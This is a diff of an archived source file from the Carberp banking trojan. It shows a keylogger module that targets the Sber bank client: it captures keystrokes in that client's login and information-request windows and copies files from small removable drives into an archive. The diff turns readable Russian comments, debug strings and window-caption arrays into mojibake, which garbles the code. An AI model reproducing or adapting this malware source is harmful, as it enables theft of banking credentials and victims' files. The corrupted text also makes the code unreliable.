@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     вЂ”
+ */
 //---------------------------------------------------------------------------
 
 
@@ -17,14 +28,14 @@ namespace SBERKEYLOGDEBUGSTRINGS
 	#include "DbgTemplates.h"
 }
 
-// Объявляем шаблон вывода отладочных строк
+// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 #define SBRKDBG SBERKEYLOGDEBUGSTRINGS::DBGOutMessage<>
 
 //-----------------------------------------------------------------------------
 
 
 
-#define MAX_DRIVE_SIZE  2097152 /* 2 МБ */
+#define MAX_DRIVE_SIZE  2097152 /* 2 пїЅпїЅ */
 
 
 //---------------------------------------------------------------------------
@@ -37,7 +48,7 @@ void SberKeyLoggerSumFileSize(PFindData Search, PCHAR FileName, LPVOID Data, boo
 	HANDLE File = (HANDLE)pCreateFileA(FileName, GENERIC_READ, FILE_SHARE_READ, NULL,
 														OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
 
-	// Если не удалось прочесть, выходим с ошибкой
+	// пїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	if (File != INVALID_HANDLE_VALUE)
 	{
         DWORD HS = 0;
@@ -53,8 +64,8 @@ void SberKeyLoggerSumFileSize(PFindData Search, PCHAR FileName, LPVOID Data, boo
 
 void SberKeyLoggerCalcDriveSize(PCHAR Drive, LPVOID Data, bool &Cancel)
 {
-	// Перебираем все файлы диска и определяем размер
-    SBRKDBG("SBER_KEYLOGGER", "Обнаружено устройство %s", Drive);
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
+    SBRKDBG("SBER_KEYLOGGER", "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ %s", Drive);
 
 
 	DWORD EMode = (DWORD)pSetErrorMode(SEM_FAILCRITICALERRORS);
@@ -69,7 +80,7 @@ void SberKeyLoggerCalcDriveSize(PCHAR Drive, LPVOID Data, bool &Cancel)
 		PCHAR Dr = STR::New(Drive, 1);
 		PCHAR Name = STR::New(2, "DRIVE_", Dr);
 
-		SBRKDBG("SBER_KEYLOGGER", "Добавляем файлы устройства в архив в папку %s", Name);
+		SBRKDBG("SBER_KEYLOGGER", "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅ %s", Name);
 
 		KeyLogger::AddDirectory(Drive, Name);
 
@@ -83,8 +94,8 @@ void SberKeyLoggerCalcDriveSize(PCHAR Drive, LPVOID Data, bool &Cancel)
 
 void SberKeyLoggerActivateFilter(LPVOID Sender)
 {
-	// Ишем маленький съёмный носитель
-	SBRKDBG("SBER_KEYLOGGER", "Сработал фильтр. Ищем флеш устройство");
+	// пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+	SBRKDBG("SBER_KEYLOGGER", "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ. пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ");
 	EnumDrives(DRIVE_REMOVABLE, SberKeyLoggerCalcDriveSize, NULL);
 
 }
@@ -95,17 +106,17 @@ void SberKeyLoggerActivateFilter(LPVOID Sender)
 
 void RegisterSberKeyLogger()
 {
-	// Функция регистрирует кейлогер для системы Sber
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ Sber
 
     char SberSystemName[] = {'S', 'B', 'E', 'R',  0};
 
 	PKeyLogSystem S = KeyLogger::AddSystem(SberSystemName, 0x321ECF12 /* wclnt.exe */);
 	if (S != NULL)
 	{
-		char Caption1[] = {'В', 'х', 'о', 'д', ' ', 'в', ' ', 'с', 'и', 'с', 'т', 'е', 'м', 'у',  0};
-		char Caption2[] = {'З', 'а', 'п', 'р', 'о', 'с', ' ', 'и', 'н', 'ф', 'о', 'р', 'м', 'а', 'ц', 'и', 'и',  0};
+		char Caption1[] = {'пїЅ', 'пїЅ', 'пїЅ', 'пїЅ', ' ', 'пїЅ', ' ', 'пїЅ', 'пїЅ', 'пїЅ', 'пїЅ', 'пїЅ', 'пїЅ', 'пїЅ',  0};
+		char Caption2[] = {'пїЅ', 'пїЅ', 'пїЅ', 'пїЅ', 'пїЅ', 'пїЅ', ' ', 'пїЅ', 'пїЅ', 'пїЅ', 'пїЅ', 'пїЅ', 'пїЅ', 'пїЅ', 'пїЅ', 'пїЅ', 'пїЅ',  0};
 
-		// Добавляем фильтры
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 		KeyLogger::AddFilter(S, true, true, NULL, Caption1, FILTRATE_PARENT_WND, LOG_KEYBOARD, 4);
 
 		PKlgWndFilter F = KeyLogger::AddFilter(S, true, true, NULL, Caption2, FILTRATE_PARENT_WND, LOG_KEYBOARD, 4);
